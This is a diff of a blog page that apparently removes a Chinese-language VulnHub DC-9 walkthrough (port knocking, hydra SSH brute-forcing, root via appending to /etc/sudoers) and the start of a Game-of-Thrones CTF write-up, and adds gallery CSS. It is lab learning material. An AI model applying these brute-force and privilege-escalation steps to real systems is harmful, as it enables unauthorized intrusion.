-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# nmap -p 22 192.168.3.45            </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-10 19:09 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.3.45</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE    SERVICE</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">MAC Address: 08:00:27:95:4E:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.30 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# 7469,8475,9842         </span><br><span class="line">7469,8475,9842：未找到命令</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# nc 192.168.3.45 7469                                                    </span><br><span class="line">(UNKNOWN) [192.168.3.45] 7469 (?) : Connection refused</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# nc 192.168.3.45 8475</span><br><span class="line">(UNKNOWN) [192.168.3.45] 8475 (?) : Connection refused</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# nc 192.168.3.45 9842</span><br><span class="line">(UNKNOWN) [192.168.3.45] 9842 (?) : Connection refused</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# nmap -p 22 192.168.3.45</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-10 19:10 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.3.45</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">MAC Address: 08:00:27:95:4E:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.25 seconds</span><br></pre></td></tr></table></figure>
-
-<p>或者直接<code>knock</code>命令启动, 若未安装执行 <code>apt install knockd -y</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# knock 192.168.3.45 7469 8475 9842</span><br></pre></td></tr></table></figure>
-
-<h2 id="4-hydra"><a href="#4-hydra" class="headerlink" title="4.hydra"></a>4.hydra</h2><p>用<code>hrdra</code>爆破ssh登录的账号密码</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# hydra -L user.txt -P pass.txt ssh://192.168.3.45 -t 4</span><br><span class="line"></span><br><span class="line">[STATUS] 80.00 tries/min, 80 tries <span class="keyword">in</span> 00:01h, 281 to <span class="keyword">do</span> <span class="keyword">in</span> 00:04h, 4 active</span><br><span class="line">[22][ssh] host: 192.168.3.45   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.3.45   login: joeyt   password: Passw0rd</span><br><span class="line">[STATUS] 91.33 tries/min, 274 tries <span class="keyword">in</span> 00:03h, 87 to <span class="keyword">do</span> <span class="keyword">in</span> 00:01h, 4 active</span><br><span class="line">[22][ssh] host: 192.168.3.45   login: janitor   password: Ilovepeepee</span><br><span class="line">[STATUS] 89.50 tries/min, 358 tries <span class="keyword">in</span> 00:04h, 3 to <span class="keyword">do</span> <span class="keyword">in</span> 00:01h, 4 active</span><br><span class="line">1 of 1 target successfully completed, 3 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-10 19:25:08</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>[!NOTE] -L user.txt</p>
-<ul>
-<li><code>-L</code>：大写 L，对应「批量用户名」，指定一个文本格式的用户名字典文件（每行一个用户名）</li>
-<li><code>user.txt</code>：当前工作目录下的用户名字典文件（若文件不在当前目录，需填写绝对路径，如 &#96;&#x2F;t</li>
-</ul>
-</blockquote>
-<h3 id="用户chandlerb"><a href="#用户chandlerb" class="headerlink" title="用户chandlerb"></a>用户chandlerb</h3><p>无有用的信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">chandlerb@dc-9:~$ <span class="built_in">ls</span> -al</span><br><span class="line">total 12</span><br><span class="line">drwx------  3 chandlerb chandlerb 4096 Jan 10 21:23 .</span><br><span class="line">drwxr-xr-x 19 root      root      4096 Dec 29  2019 ..</span><br><span class="line">lrwxrwxrwx  1 chandlerb chandlerb    9 Dec 29  2019 .bash_history -&gt; /dev/null</span><br><span class="line">drwx------  3 chandlerb chandlerb 4096 Jan 10 21:23 .gnupg</span><br><span class="line">chandlerb@dc-9:~$ <span class="built_in">history</span></span><br><span class="line">    1  <span class="built_in">ls</span> -al</span><br><span class="line">    2  <span class="built_in">history</span></span><br><span class="line">chandlerb@dc-9:~$ <span class="built_in">cd</span> .gnupg/</span><br><span class="line">chandlerb@dc-9:~/.gnupg$ <span class="built_in">ls</span> -l</span><br><span class="line">total 4</span><br><span class="line">drwx------ 2 chandlerb chandlerb 4096 Jan 10 21:23 private-keys-v1.d</span><br><span class="line">chandlerb@dc-9:~/.gnupg$ <span class="built_in">cd</span> private-keys-v1.d/</span><br><span class="line">chandlerb@dc-9:~/.gnupg/private-keys-v1.d$ <span class="built_in">ls</span> -l</span><br><span class="line">total 0</span><br><span class="line">chandlerb@dc-9:~/.gnupg/private-keys-v1.d$ <span class="built_in">sudo</span> -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the <span class="built_in">local</span> System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> chandlerb: </span><br><span class="line">Sorry, user chandlerb may not run <span class="built_in">sudo</span> on dc-9.</span><br></pre></td></tr></table></figure>
-<h3 id="用户joeyt"><a href="#用户joeyt" class="headerlink" title="用户joeyt"></a>用户joeyt</h3><p>同样没发现有用的数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">joeyt@dc-9:~$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwx------  3 joeyt joeyt 4096 Jan 10 21:23 .</span><br><span class="line">drwxr-xr-x 19 root  root  4096 Dec 29  2019 ..</span><br><span class="line">lrwxrwxrwx  1 joeyt joeyt    9 Dec 29  2019 .bash_history -&gt; /dev/null</span><br><span class="line">drwx------  3 joeyt joeyt 4096 Jan 10 21:23 .gnupg</span><br><span class="line">joeyt@dc-9:~$ sudo -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the local System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    #1) Respect the privacy of others.</span><br><span class="line">    #2) Think before you type.</span><br><span class="line">    #3) With great power comes great responsibility.</span><br></pre></td></tr></table></figure>
-
-<h3 id="用户janitor"><a href="#用户janitor" class="headerlink" title="用户janitor"></a>用户janitor</h3><p>发现几个密码，添加到刚才的<code>pass.txt</code>中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">janitor@dc-9:~$ ls -la</span><br><span class="line">total 16</span><br><span class="line">drwx------  4 janitor janitor 4096 Jan 10 21:24 .</span><br><span class="line">drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..</span><br><span class="line">lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -&gt; /dev/null</span><br><span class="line">drwx------  3 janitor janitor 4096 Jan 10 21:24 .gnupg</span><br><span class="line">drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin</span><br><span class="line">janitor@dc-9:~$ cat .secrets-for-putin/</span><br><span class="line">cat: .secrets-for-putin/: Is a directory</span><br><span class="line">janitor@dc-9:~$ cd .secrets-for-putin/</span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwx------ 2 janitor janitor 4096 Dec 29  2019 .</span><br><span class="line">drwx------ 4 janitor janitor 4096 Jan 10 21:24 ..</span><br><span class="line">-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt</span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt </span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure>
-
-<p><strong>重新爆破</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# hydra -L user.txt -P pass.txt ssh://192.168.3.45 -t 64</span><br><span class="line">[22][ssh] host: 192.168.3.45   login: fredf   password: B4-Tru3-001</span><br><span class="line">[22][ssh] host: 192.168.3.45   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.3.45   login: joeyt   password: Passw0rd</span><br><span class="line">[22][ssh] host: 192.168.3.45   login: janitor   password: Ilovepeepee</span><br></pre></td></tr></table></figure>
-<p>发现多了一个用户<code>fredf</code></p>
-<h3 id="用户fredf"><a href="#用户fredf" class="headerlink" title="用户fredf"></a>用户fredf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> fredf on dc-9:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User fredf may run the following commands on dc-9:</span><br><span class="line">    (root) NOPASSWD: /opt/devstuff/dist/test/test</span><br></pre></td></tr></table></figure>
-
-
-<p>查看本地的<code>/etc/sudoers</code><br><img src="/assets/Pasted%20image%2020260110194213.png"></p>
-<p>直接查看<code>/opt/devstuff/dist/test/test</code>发现是乱码，到上级目录发现是<code>python</code>文件编译的，直接查看源码<code>test.py</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff/dist/test$ cd ..</span><br><span class="line">fredf@dc-9:/opt/devstuff/dist$ ls</span><br><span class="line">test</span><br><span class="line">fredf@dc-9:/opt/devstuff/dist$ cd ..</span><br><span class="line">fredf@dc-9:/opt/devstuff$ ls -l</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 3 root root 4096 Dec 29  2019 build</span><br><span class="line">drwxr-xr-x 3 root root 4096 Dec 29  2019 dist</span><br><span class="line">drwxr-xr-x 2 root root 4096 Dec 29  2019 __pycache__</span><br><span class="line">-rw-r--r-- 1 root root  250 Dec 29  2019 test.py</span><br><span class="line">-rw-r--r-- 1 root root  959 Dec 29  2019 test.spec</span><br><span class="line">fredf@dc-9:/opt/devstuff$ cat test.py </span><br><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len (sys.argv) != 3 :</span><br><span class="line">    print (&quot;Usage: python test.py read append&quot;)</span><br><span class="line">    sys.exit (1)</span><br><span class="line"></span><br><span class="line">else :</span><br><span class="line">    f = open(sys.argv[1], &quot;r&quot;)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = open(sys.argv[2], &quot;a&quot;)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
-
-
-<blockquote>
-<p>[!Info] test.py<br>这个 Python 脚本是一个用于文件操作的工具，它的核心功能是读取一个文件的内容，然后将其追加到另一个文件的末尾。<br>简单来说，这个脚本完成了以下几步：</p>
-</blockquote>
-<ol>
-<li><strong>参数检查</strong>：首先，它检查运行脚本时提供的参数个数。脚本期望除了自身的名字（<code>sys.argv[0]</code>）外，还有两个参数：一个用于读取的文件，一个用于追加的文件。如果参数数量不对，会打印用法说明并退出。</li>
-<li><strong>读取文件</strong>：它打开第一个参数指定的文件（<code>sys.argv[1]</code>），读取其全部内容。</li>
-<li><strong>追加内容</strong>：接着，它打开第二个参数指定的文件（<code>sys.argv[2]</code>），并将从第一个文件读出的内容追加到它的末尾。<br>一个简单的使用例子如下：</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设当前目录有 file1.txt（内容为&quot;Hello&quot;）和 file2.txt（内容为&quot;World&quot;）</span></span><br><span class="line">python test.py file1.txt file2.txt</span><br><span class="line"><span class="comment"># 运行后，file2.txt 的内容将变为 &quot;WorldHello&quot;</span></span><br></pre></td></tr></table></figure>
-<h2 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h2><p>可以查看本地的<code>/etc/sudoers</code>，将<code>%sudo   ALL=(ALL:ALL) ALL</code>复制到<code>fredf</code>下的<code>a.txt</code>中</p>
-<blockquote>
-<p>[!Warning] <code>/etc/sudoers</code><br><code>/etc/sudoers</code> 是 Linux&#x2F;Unix 系统中<strong>核心的权限控制文件</strong>，用于定义哪些用户 &#x2F; 用户组可以以何种方式（是否需要密码、可执行哪些命令）临时获取 <code>root</code> 或其他用户的权限。其设计目标是在保障系统安全的前提下，实现权限的精细化分配，</p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.doubao.com/thread/w91afa01ef034300b">https://www.doubao.com/thread/w91afa01ef034300b</a> 介绍<code>/etc/sudoers</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff$ cd /tmp</span><br><span class="line">fredf@dc-9:/tmp$ nano a.txt</span><br><span class="line">fredf@dc-9:/tmp$ cat a.txt </span><br><span class="line">fredf   ALL=(ALL:ALL) ALL</span><br><span class="line">fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test a.txt /etc/sudoers</span><br><span class="line">fredf@dc-9:/tmp$ sudo su -</span><br><span class="line">[sudo] password for fredf: </span><br><span class="line">root@dc-9:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">root@dc-9:~# cat theflag.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗</span><br><span class="line">████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║</span><br><span class="line">██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║</span><br><span class="line">██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝</span><br><span class="line">██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗</span><br><span class="line">╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝</span><br><span class="line">                                                                             </span><br><span class="line">Congratulations - you have done well to get to this point.</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those</span><br><span class="line">who have taken the time to complete the various DC challenges.</span><br><span class="line"></span><br><span class="line">I also want to send out a big thank you to the various members of @m0tl3ycr3w .</span><br><span class="line"></span><br><span class="line">They are an inspirational bunch of fellows.</span><br><span class="line"></span><br><span class="line">Sure, they might smell a bit, but...just kidding.  :-)</span><br><span class="line"></span><br><span class="line">Sadly, all things must come to an end, and this will be the last ever</span><br><span class="line">challenge in the DC series.</span><br><span class="line"></span><br><span class="line">So long, and thanks for all the fish.</span><br></pre></td></tr></table></figure>
-
-<p>[^1]: </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/03/%E9%9D%B6%E6%9C%BA/vulnhub/Game-of-Thrones/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/saber.jpg">
-      <meta itemprop="name" content="zhaochoudecat">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zhaochoudecat">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/05/03/%E9%9D%B6%E6%9C%BA/vulnhub/Game-of-Thrones/" class="post-title-link" itemprop="url">Game-of-Thrones</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2026-05-03 00:00:00 / 修改时间：04:03:57" itemprop="dateCreated datePublished" datetime="2026-05-03T00:00:00+08:00">2026-05-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶机</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/game-of-thrones-ctf-1,201/">https://www.vulnhub.com/entry/game-of-thrones-ctf-1,201/</a><br><img src="/assets/Pasted%20image%2020251223194902.png"></p>
-<blockquote>
-<p>[!tip]- tips<br>Get the 7 kingdom flags and the 4 extra content flags (3 secret flags + final battle flag). There are 11 in total. </p>
-</blockquote>
-<p>权力的游戏</p>
-<h2 id="1-arp"><a href="#1-arp" class="headerlink" title="1.arp"></a>1.arp</h2><p><img src="/assets/Pasted%20image%2020251223205139.png"></p>
-<h2 id="2-namp"><a href="#2-namp" class="headerlink" title="2.namp"></a>2.namp</h2><p>推荐用这种方式, 可以扫描到1337端口，下面的命令扫描不到</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 -p- 192.168.43.13 <span class="comment"># 全开扫描+版本+系统+脚本探测</span></span><br></pre></td></tr></table></figure>
-<p><img src="/assets/Pasted%20image%2020251224104738.png"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sS -sV -sC -O 192.168.3.17</span><br></pre></td></tr></table></figure>
-
-<p><img src="/assets/Pasted%20image%2020251223205223.png"></p>
-<blockquote>
-<p>[!summary]- 端口号<br>port doamin<br>21 ftp<br>22 ssh<br>53 domain<br>80 Apach httpd<br>143 imap<br>3306 mysql<br>5432 postgresql<br>10000 MiniServ</p>
-</blockquote>
-<p>-sV 服务程序以及版本信息<br>-A  综合扫描<br>-oG 分类保存<br>-T4 快速扫描</p>
-<p>[[扫描结果]]</p>
-<p><img src="/assets/Pasted%20image%2020260102212517.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1737,6 +2041,561 @@
 </div>
 
 
+<div class="saber-gallery motion-element">
+  <div class="saber-gallery-container" id="saberGallery">
+    <div class="saber-gallery-track">
+      <img class="saber-gallery-img" src="/images/blue_saber.png" alt="Blue Saber" data-index="0">
+      <img class="saber-gallery-img" src="/images/daily_saber.png" alt="Daily Saber" data-index="1">
+      <img class="saber-gallery-img" src="/images/dark_saber.png" alt="Dark Saber" data-index="2">
+    </div>
+    <button class="saber-gallery-arrow saber-gallery-prev" id="saberPrev" aria-label="上一张">
+      <i class="fa fa-chevron-left"></i>
+    </button>
+    <button class="saber-gallery-arrow saber-gallery-next" id="saberNext" aria-label="下一张">
+      <i class="fa fa-chevron-right"></i>
+    </button>
+    <div class="saber-gallery-dots">
+      <span class="saber-gallery-dot active"></span>
+      <span class="saber-gallery-dot"></span>
+      <span class="saber-gallery-dot"></span>
+    </div>
+  </div>
+</div>
+
+<div class="saber-lightbox" id="saberLightbox">
+  <div class="saber-lightbox-overlay"></div>
+  <button class="saber-lightbox-close" id="saberLightboxClose" aria-label="关闭">
+    <i class="fa fa-times"></i>
+  </button>
+  <button class="saber-lightbox-arrow saber-lightbox-prev" id="saberLightboxPrev" aria-label="上一张">
+    <i class="fa fa-chevron-left"></i>
+  </button>
+  <button class="saber-lightbox-arrow saber-lightbox-next" id="saberLightboxNext" aria-label="下一张">
+    <i class="fa fa-chevron-right"></i>
+  </button>
+  <div class="saber-lightbox-content">
+    <img class="saber-lightbox-img" id="saberLightboxImg" src="" alt="">
+  </div>
+  <div class="saber-lightbox-counter" id="saberLightboxCounter"></div>
+</div>
+
+<style>
+.saber-gallery {
+  margin-top: 15px;
+  text-align: center;
+}
+.saber-gallery-container {
+  position: relative;
+  width: 100%;
+  height: 280px;
+  overflow: hidden;
+  border-radius: 8px;
+  cursor: pointer;
+  user-select: none;
+  -webkit-user-select: none;
+}
+.saber-gallery-container:active {
+  cursor: pointer;
+}
+.saber-gallery-track {
+  display: flex;
+  height: 100%;
+  transition: transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+  will-change: transform;
+}
+.saber-gallery-img {
+  flex-shrink: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+  object-position: center;
+  pointer-events: none;
+}
+.saber-gallery-arrow {
+  position: absolute;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 32px;
+  height: 32px;
+  border: none;
+  border-radius: 50%;
+  background: rgba(0, 0, 0, 0.4);
+  color: #fff;
+  font-size: 14px;
+  cursor: pointer;
+  opacity: 0;
+  transition: opacity 0.3s ease, background 0.3s ease;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 2;
+}
+.saber-gallery-container:hover .saber-gallery-arrow {
+  opacity: 1;
+}
+.saber-gallery-arrow:hover {
+  background: rgba(0, 0, 0, 0.7);
+}
+.saber-gallery-arrow.disabled {
+  opacity: 0.2 !important;
+  cursor: not-allowed;
+}
+.saber-gallery-prev {
+  left: 8px;
+}
+.saber-gallery-next {
+  right: 8px;
+}
+.saber-gallery-dots {
+  position: absolute;
+  bottom: 10px;
+  left: 50%;
+  transform: translateX(-50%);
+  display: flex;
+  gap: 6px;
+  z-index: 2;
+}
+.saber-gallery-dot {
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.5);
+  transition: background 0.3s ease, transform 0.3s ease;
+  cursor: pointer;
+}
+.saber-gallery-dot.active {
+  background: rgba(255, 255, 255, 0.95);
+  transform: scale(1.3);
+}
+
+/* Lightbox Styles */
+.saber-lightbox {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 9999;
+  display: none;
+  opacity: 0;
+  transition: opacity 0.3s ease;
+}
+.saber-lightbox.active {
+  display: flex;
+  opacity: 1;
+}
+.saber-lightbox-overlay {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.92);
+  cursor: pointer;
+}
+.saber-lightbox-content {
+  position: relative;
+  z-index: 2;
+  margin: auto;
+  max-width: 90vw;
+  max-height: 90vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.saber-lightbox-img {
+  max-width: 100%;
+  max-height: 90vh;
+  object-fit: contain;
+  border-radius: 4px;
+  transform: scale(0.8);
+  transition: transform 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+}
+.saber-lightbox.active .saber-lightbox-img {
+  transform: scale(1);
+}
+.saber-lightbox-close {
+  position: absolute;
+  top: 20px;
+  right: 30px;
+  width: 40px;
+  height: 40px;
+  border: none;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.15);
+  color: #fff;
+  font-size: 18px;
+  cursor: pointer;
+  z-index: 3;
